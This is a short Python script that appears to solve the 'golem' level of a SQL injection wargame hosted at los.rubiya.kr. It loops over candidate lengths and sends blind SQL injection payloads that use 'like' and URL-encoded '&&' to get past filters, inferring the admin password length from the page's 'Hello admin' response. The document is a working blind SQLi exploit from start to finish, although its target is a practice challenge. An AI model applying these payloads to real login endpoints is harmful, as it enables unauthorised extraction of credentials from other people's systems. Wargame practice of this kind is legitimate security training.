import requests
url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
cookie = {'PHPSESSID' : 개인쿠키값}

for i in range(1, 30):
    req_url = url + f"?pw= '||id like 'admin'%26%26length(pw) like {i}%23"
    res = requests.get(req_url, cookies=cookie)
    if "<h2>Hello admin</h2>" in res.text:
        print(f"{i} -> O")
        break
    else:
        print(f"{i} ---> X")